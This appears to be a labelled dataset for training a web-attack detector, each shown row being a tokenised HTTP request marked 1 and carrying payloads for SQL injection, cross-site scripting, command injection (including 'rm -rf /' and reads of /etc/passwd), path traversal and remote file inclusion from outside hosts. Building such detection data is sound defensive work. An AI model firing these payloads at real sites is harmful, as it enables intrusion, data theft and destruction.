sentences 	 labels
/ string / strings / parameters = <  !  --  # echo var =  " server_name  --  >  \r\n\r\n 	 1
/ search / submit . php ? config [  \  " sipssys \  "  ]  = http :  /  / cirt . net / rfiinc . txt ?  \r\n\r\n 	 1
/ top . php ? stuff =  "  & rm \ x0bq71858742 & rem \ x0b  \r\n\r\n 	 1
/ string / strings / parameters = |   [  5 -ne  $  ( echo izdfyz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  #  \r\n\r\n 	 1
/ string / strings / parameters = < source srcset =  " x "  >  < img onerror =  " confirm ( 5 )  "  >  <  / picture >  \r\n\r\n 	 1
/ examples / jsp / checkbox / index . php ? op = default & date = 200607 '  union select 1 , 162548266 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  \r\n\r\n 	 1
/ string / strings / parameters = | echo $ ifsujplgh $  (  ( 62 + 6 )  )  $  ( echo $ ifsujplgh ) ujplgh  \r\n\r\n 	 1
/ string / strings / parameters = 1 ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 --  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo usunjp )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = -8519 %  '  )  )  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ 0rufe52p . fts ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ javascript / postpaid . exe  \r\n\r\n 	 1
/ string / strings / parameters = < body onpageshow = alert ( 1 )  >  \r\n\r\n 	 1
/ string / strings / parameters = -1 < img src =  "  " mocha : document . cookie = true ;  "  "  >  \r\n\r\n 	 1
/ string / strings / parameters = "  | echo saqmpn $  (  ( 71 + 20 )  )  $  ( echo saqmpn ) saqmpn |  \r\n\r\n 	 1
/ string / strings / parameters = | echo ddljjw $  (  ( 33 + 23 )  )  $  ( echo ddljjw ) ddljjw '  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qhsduy )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ string / modo = registro & login = butcher & password = panoso & nombre = adelqui & apellidos = riu + riutort & email = wiren @ acch . mk & dni = 92652474x & direccion = carretera + industrial ,  + 60 +  & ciudad = elduain & cp = 26250 & provincia = vila <  !  --  # exec + cmd =  " rm + -rf +  /  ; cat +  / etc / passwd "  +  --  >  & ntc = 7730205532508885 & b1 = registrar  \r\n\r\n 	 1
/ javascript / bio . exe  \r\n\r\n 	 1
/ en-us / 7o5qp766 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = % s % p % x % d  \r\n\r\n 	 1
/ news . php ? scriptpath = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ?  \r\n\r\n 	 1
/ examples / jsp / sessions / themes / program / themesettings . inc . php ? themesdir =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select sijr where 7250 = 7250 ; if ( 1665 = 3845 )  select 1665 else drop function nzod --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' kqnj '  where 9483 = 9483 or elt ( 5873 = 5873 , sleep ( 5 )  )  #  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / sgdynamo . exe ? htname = sgdynamo . exe  \r\n\r\n 	 1
/ phfito / phfito-post ? src_path = xxpathxx  \r\n\r\n 	 1
/ string / modo = insertar & precio = 9702 & b1 = confirmar /  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  where 7228 = 7228 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = |   [  1 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo wyaquw )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ i686v90l . nsf ?  < script > document . cookie =  " testfutf = 1550 ;  "  <  / script >  \r\n\r\n 	 1
/ 9kr0ih0v . jsp ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  \r\n\r\n 	 1
/ t7tm4m0b . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = < style onload =  ' execscript (  " inputbox + 1 "  ,  " vbscript "  )  ;  '  >  \r\n\r\n 	 1
/ quagynka . mscgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ iajtej82 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ cgi-bin / htgrep ? file = index . html & hdr =  / etc / passwd  \r\n\r\n 	 1
/ interface / login / login_frame . php ? site = paros "  style =  " background : url ( javascript : alert (  ' owasp zap '  )  )  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  where 8707 = 8707 and 3210 = 1477 --  \r\n\r\n 	 1
/ scripts / carbo . dll ? icatcommand =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini & catalogname = catalog  \r\n\r\n 	 1
/ string / strings / parameters = hi '  )  or  (  ' a '  =  ' a  \r\n\r\n 	 1
/ string / strings / parameters = -4462 %  "  "  )  or 8571 = 8571 --  \r\n\r\n 	 1
/ string / strings / parameters = | echo uffoux $  (  ( 59 + 47 )  )  $  ( echo uffoux ) uffoux |  \r\n\r\n 	 1
/ string / modo = entrar & login = pagi & pwd = refr2nd0 & remember = off '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo vzettm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  union all select null , null , null , null , null , null --  \r\n\r\n 	 1
/ gvx7m5ti . htm ?  < script > document . cookie =  " testwldz = 3506 ;  "  <  / script >  \r\n\r\n 	 1
/ javascript / php . exe  \r\n\r\n 	 1
/ top . php ? stuff =  "  & ping \ x09-w \ x097000 \ x09-n \ x091 \ x094 . 3 . 2 . 1 & rem \ x09  \r\n\r\n 	 1
/ javascript / edits . exe  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / index . php ? lng =  .  .  / system_footer & sensor_program = phpsysinfo_241 . nasl  \r\n\r\n 	 1
/ string / strings / parameters = -4427 '  )  )  union all select 6357 , 6357 , 6357 , 6357 , 6357 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  '  %  '  =  '  \r\n\r\n 	 1
/ m2f / m2f_forum . php ? m2f_root_path = xxpathxx  \r\n\r\n 	 1
/ administrator / components / com_jpack / includes / caltinstaller . php ? mosconfig_absolute_path = xxpathxx ?  \r\n\r\n 	 1
/ string / strings / parameters = ; echo $ ifsswbwiu $  (  ( 54 + 20 )  )  $  ( echo $ ifsswbwiu ) swbwiu &  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / login . php ? course =  "  >  < script > alert ( atutor_xss . nasl )  <  / script >  \r\n\r\n 	 1
/ javascript / shell . exe  \r\n\r\n 	 1
/ string / modo = registro & login = kanya & password = trasladadora & nombre = angelo & apellidos = goya + asensio & email = bowers @ puntodevistafotografia . gf & dni = 56007542n & direccion = c /  + baja + 58 ,  + 1 ? h & ciudad = helechosa + de + los + montes & cp = 10181 & provincia = valencia & ntc = 8914897432837758 & b1 =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 1
/ awstats / awstats . pl ? migrate =  | echo ; echo x ; echo | awstats544698 . txt  \r\n\r\n 	 1
/ x2gyorli . pl ?  < meta http-equiv = set-cookie content =  " testwhac = 3130 "  >  \r\n\r\n 	 1
/ string / strings / parameters = < xml id = i >  < x >  < c >  <  !  [ cdata [  < img id = xss src =  "  " javas ]  ]  <  !  [ cdata [ cript : alert (  ' xss '  )  ;  "  "  >  ]  ]  <  / c >  < x >  <  / xml >  \r\n\r\n 	 1
/ l13b77e5 . cfc ?  < meta http-equiv = set-cookie content =  " testjvvf = 7721 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' vfkl '  where 1713 = 1713 and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  )  +  '  \r\n\r\n 	 1
/ examples / jsp / checkbox / mlog . html ? screen =  / etc / passwd  \r\n\r\n 	 1
/ recordings / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search  \r\n\r\n 	 1
/ string / str =  $  ( echo dvduln )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  \r\n\r\n 	 1
/ string / modo = entrar & login = rouer9 & pwd = g0r2o94 & remember = off /  & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ybjqlf )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  \r\n\r\n 	 1
/  < script > alert (  ' vulnerable '  )  <  / script >  . shtm  \r\n\r\n 	 1
/ modules . php ? name = search & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ ows-bin / fileseek . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head =  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / ion-p . exe ? page = c :  \  \ winnt \  \ win . ini  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  ' gpqx '  like  ' gpqx  \r\n\r\n 	 1
/ bzuf9ozq . aspx ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / logbook . pl ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / bin / cat  / etc / passwd \ x00 |  \r\n\r\n 	 1
/ cacti / survey . inc . php ? path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = echo mizdmg $  (  ( 78 + 69 )  )  $  ( echo mizdmg ) mizdmg "  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' ycsv '  where 3628 = 3628 and char ( 107 )  |  | char ( 121 )  |  | char ( 97 )  |  | char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 1
/ string / strings / parameters = "  ; echo pdmnti $  (  ( 23 + 51 )  )  $  ( echo pdmnti ) pdmnti  \r\n\r\n 	 1
/ examples / jsp / sessions / index . php ? user_langue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ javascript / event . exe  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo ggpyar )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 6044 = 6044 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  \r\n\r\n 	 1
/ ddoworrl . php3 ?  < meta http-equiv = set-cookie content =  " testvlau = 8517 "  >  \r\n\r\n 	 1
/ javascript / tn . exe  \r\n\r\n 	 1
/ en-us / hipkz026 . x ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  \r\n\r\n 	 1
/ examples / servlets / servlet / index . php ? cid =  '  \r\n\r\n 	 1
/ string / strings / parameters = )  ;  } print (  ` echo kayvrd \ necho  $  (  ( 4 + 54 )  )  \ necho kayvrd \ necho kayvrd `  )  ;  )  } kayvrd  \r\n\r\n 	 1
/ ocs / openemr-2 . 8 . 2 / custom / import_xml . php ? srcdir = xxpathxx ?  \r\n\r\n 	 1
/ qhvu0pdg . html ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  \r\n\r\n 	 1
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  \  { file }  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as pafp where 6770 = 6770 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = -6279 '  )  union all select 3026 , 3026 , 3026 , 3026 , 3026 , 3026 , 3026 , 3026 --  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / shared / help . php ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ templates / form_header . php ? noticemsg =  < script > javascript : alert ( document . cookie )  <  / script >  \r\n\r\n 	 1
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  .  .  .  .  { file }  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  as rqbo where 2243 = 2243 and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  --  \r\n\r\n 	 1
/ n1afe1y6 . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / cgiip . exe / wservice = wsbroker1 / webutil / ping . p  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = "  \  "  >  < scri \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  "  " twmy "  "  =  "  " twmy  \r\n\r\n 	 1
/ gvx7m5ti . kspx ?  < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  \r\n\r\n 	 1
/ v3axg1p8 . cfm ?  < meta http-equiv = set-cookie content =  " testxagh = 6987 "  >  \r\n\r\n 	 1
/ help . php ? q =  " ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  \r\n\r\n 	 1
/ string / str =  $  ( echo okmzve )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 1
/ string / strings / parameters = <  ? xml-stylesheet type =  " text / xsl "  href =  "  #  "  ?  >  < img xmlns =  " x-schema : test . xdr "  /  >  \r\n\r\n 	 1
/ string / strings / parameters = order by 21 --  \r\n\r\n 	 1
/ string / id = 3 & nombre = jamn + ibricoparos "  + style =  " background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 39 & cantidad = 48 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ scripts / ion-p . exe ? page = c :  \  \ winnt \  \ win . ini  \r\n\r\n 	 1
/ daddy ' s worst nightmare 4 /  \r\n\r\n 	 1
/ string / strings / parameters = having 1 = 0 #  \r\n\r\n 	 1
/ t3af3tdz . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = & echo bvrsli $  (  ( 35 + 17 )  )  $  ( echo bvrsli ) bvrsli &  \r\n\r\n 	 1
/ javascript / data . exe  \r\n\r\n 	 1
/ examples / jsp / sessions / upgrade / index . php ? steporder [  ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ examples / jsp / num / bb-hist . sh ? histfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ ap58k3ci . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ aoy7kzbh . exe  \r\n\r\n 	 1
/ help . php ? q =  '  & uname  #  \r\n\r\n 	 1
/ main . php ? stuff =  & ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  \r\n\r\n 	 1
/ string / strings / parameters = '  "  --  >  <  / style >  <  / script >  < script > rwar ( 0x00010e )  <  / script >  \r\n\r\n 	 1
/ forum1_professionnel . asp ? n = 1771 & amp ; nn =  / etc / passwd \ x00 & amp ; page = 1  \r\n\r\n 	 1
/ ows-bin / query ? mss =  .  .  / config  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  ; select  *  from generate_series ( 9709 , 9709 , case when  ( 9709 = 7795 )  then 1 else 0 end )  limit 1 --  \r\n\r\n 	 1
/ examples / jsp / cal / al_initialize . php ? alpath =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) ydpu )  and  (  '  %  '  =  '  \r\n\r\n 	 1
/ cgi-bin / index . php ? op = default & date = 200607 '  union select 1 , 1192121872 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  \r\n\r\n 	 1
/ string / strings / parameters = -9217 or 9323 = 9323 #  \r\n\r\n 	 1
/ scripts / mundimail / template / simpledefault / admin / _masterlayout . php ? top = http :  /  / 192 . 168 . 202 . 96 : 8080 / swgnhpydbq0t ?  \r\n\r\n 	 1
/ cgi-bin / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 1303050841 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ string / strings / parameters = 1 < script > prompt ( 999691 )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  and  (  (  (  ' jhle '  like  ' jhle  \r\n\r\n 	 1
/ string / modo = registro & login = gib & password = 3l29stre & nombre = yarav & apellidos = paella + villasev & email = switzer @ grandesinventos . pt & dni = 04831932t & direccion = c /  + rio + san + lorenzo ,  + 125 ,  + 10 ? c & ciudad = alegra-dulantzi & cp = 34170 & provincia =  < script > alert (  " paros "  )  ;  <  / script >  & ntc = 3029147558638309 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo tnnfnl )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  as afxc where 7497 = 7497 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  \r\n\r\n 	 1
/ string / strings / parameters = '  ;  str =  $  ( echo rcyhem )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/ top . php ? stuff = uname  > q98617778  #  \r\n\r\n 	 1
/ examples / jsp / sessions / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  \r\n\r\n 	 1
/ string / strings / parameters = "  ) print (  ` echo coygwq ; echo  $  (  ( 40 + 21 )  )  ; echo coygwq ; echo coygwq `  )  ;  )  } coygwq  \r\n\r\n 	 1
/ en-us / account / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331905098 '  )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  (  "  " swec "  "  like  "  " swec  \r\n\r\n 	 1
/ string / strings / parameters = -2007 %  '  )  )  union all select 7298 , 7298 , 7298 #  \r\n\r\n 	 1
/ vjbrrppi . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / modoa = registro & login = ochman & password = d5j8dero & nombre = erico & apellidos = buscart & email = flavin @ opel-e-flex . kr & dni = 20589158h & direccion = passatge + far ,  + 90 + 8 ? e & ciudad = santibez + del + val & cp = 46330 & provincia = lleida & ntc = 4447259758279371 & b1 = registrar  \r\n\r\n 	 1
/ uvazfs7p . php ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  \r\n\r\n 	 1
/ javascript / oaerrordetailpage . exe  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo hpibfr )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ phpmyadmin / www / delivery / fc . php ? max_type =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ top . php ? stuff = ver ;  > q97535751 & rem ;  \r\n\r\n 	 1
/ string / strings / parameters = "  & echo mtbnoe $  (  ( 46 + 26 )  )  $  ( echo mtbnoe ) mtbnoe /  /  \r\n\r\n 	 1
/ scripts / upgrade / index . php ? steporder [  ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = -7323 %  "  "  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ main . php ? stuff =  '  \ x0auname  #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  ' wsmq '  =  ' wsmq  \r\n\r\n 	 1
/ string / modo = entrar & login = nabeel & pwd = vanidosa & remember = on /  & b1 = entrar  \r\n\r\n 	 1
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  { file }  \r\n\r\n 	 1
/ top . php ? stuff =  "  & rm , q25287739 & rem ,  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  and  (  (  (  ' vbda '  like  ' vbda  \r\n\r\n 	 1
/ examples / jsp / sessions / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331904454 , 1014388214  --  \r\n\r\n 	 1
